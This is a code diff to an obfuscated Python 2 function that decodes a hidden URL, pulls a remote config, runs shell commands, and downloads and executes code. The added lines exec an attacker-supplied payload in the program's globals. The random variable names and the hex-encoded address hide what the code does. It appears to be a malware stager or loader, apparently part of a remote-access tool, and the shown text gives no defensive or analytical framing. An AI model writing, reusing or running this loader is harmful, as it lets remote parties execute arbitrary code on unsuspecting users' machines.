@@ -86,20 +86,14 @@ def main(*args, **kwargs):
         IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
         SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))
         RuthlessSpiffyTablecloth  = lambda x: os.popen(' '.join([i for i in x])).read().rstrip() if type(x) is list else os.popen(x).read().rstrip()
-        AccidentalAquaticCat      = json.loads(urllib.urlopen(SomberUnbecomingAmusement(kwargs.get('config'))).read())
-        AccidentalAquaticCat['f'] = bytes(IncontinentObtuseCucumber(__file__))
         GroovySophisticatedLemur  = os.popen('where pip' if os.name is 'nt' else 'which pip').read().rstrip()
+        AccidentalAquaticCat      = json.loads(urllib.urlopen(SomberUnbecomingAmusement(kwargs.get('config'))).read())
+        if '__file__' in globals():
+            AccidentalAquaticCat['f'] = bytes(IncontinentObtuseCucumber(__file__))
         if not len(GroovySophisticatedLemur):
             if os.name is 'nt':
-                if os.path.exists('/Python27/Scripts/pip.exe'):
-                    GroovySophisticatedLemur = '/Python27/Scripts/pip.exe' 
-            else:
-                if os.path.exists('/usr/bin/pip'):
-                    GroovySophisticatedLemur = '/usr/bin/pip'
-                elif os.path.exists('/usr/local/bin/pip'):
-                    GroovySophisticatedLemur = '/usr/local/bin/pip'
-            exec urllib.urlopen("https://bootstrap.pypa.io/get-pip.py").read() in globals()
-            return SomberUnbecomingAmusement(AccidentalAquaticCat.get('l'))
+                exec urllib.urlopen("https://bootstrap.pypa.io/get-pip.py").read() in globals()
+                exec SomberUnbecomingAmusement(AccidentalAquaticCat.get('l')) in globals()
         else:
             try:
                 os.chdir(os.path.expandvars('%TEMP%')) if os.name is 'nt' else os.chdir('/tmp')
